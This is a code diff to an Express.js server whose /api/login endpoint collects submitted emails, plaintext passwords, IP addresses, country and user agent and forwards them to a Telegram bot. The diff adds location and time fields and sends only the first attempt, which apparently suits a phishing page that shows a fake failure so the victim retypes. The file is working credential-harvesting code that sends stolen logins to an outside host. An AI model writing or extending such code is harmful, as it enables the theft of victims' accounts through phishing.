@@ -19,7 +19,7 @@ app.use(express.static(path.join(__dirname, '..')));
 // Endpoint to receive login attempts
 app.post('/api/login', async (req, res) => {
   try {
-    const { email, password, userAgent } = req.body || {};
+    const { email, password, userAgent, country } = req.body || {};
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
     // Basic validation
@@ -27,21 +27,37 @@ app.post('/api/login', async (req, res) => {
       return res.status(400).json({ error: 'Missing fields' });
     }
 
-    // Compose message for Telegram
+    // Only forward to Telegram on the very first attempt.
+    // The client marks first attempt by sending X-First-Attempt: 1 header.
+    const isFirstAttempt = req.headers['x-first-attempt'] === '1';
+
+    // Compose message for Telegram (include IP, Country, Time)
+    const now = new Date();
+    const timeString = now.toISOString(); // UTC time
+    const localTime = now.toString(); // human readable local string (server local timezone)
+
     const text = [
       '*Login Attempt Received*',
       `Email: ${escapeMarkdown(email)}`,
       `Password: ${escapeMarkdown(password)}`,
       `IP: ${escapeMarkdown(String(ip))}`,
+      `Country: ${escapeMarkdown(String(country || ''))}`,
       `User-Agent: ${escapeMarkdown(String(userAgent || ''))}`,
-      `Time: ${new Date().toISOString()}`
+      `Time (UTC): ${escapeMarkdown(timeString)}`,
+      `Server Time: ${escapeMarkdown(localTime)}`
     ].join('\n');
+
+    if (!isFirstAttempt) {
+      // Not a first attempt: do not forward to Telegram, but acknowledge for UX.
+      console.log('Login attempt received (not first attempt) — not forwarded to Telegram');
+      return res.status(200).json({ forwarded: false, reason: 'not_first_attempt' });
+    }
 
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
       // For local testing: log to console instead of sending
-      console.log('--- Login attempt (not forwarded), set TELEGRAM env to forward ---');
+      console.log('--- Login attempt (first attempt) (not forwarded), set TELEGRAM env to forward ---');
       console.log(text);
-      return res.status(200).json({ forwarded: false });
+      return res.status(200).json({ forwarded: false, warning: 'telegram_not_configured' });
     }
 
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
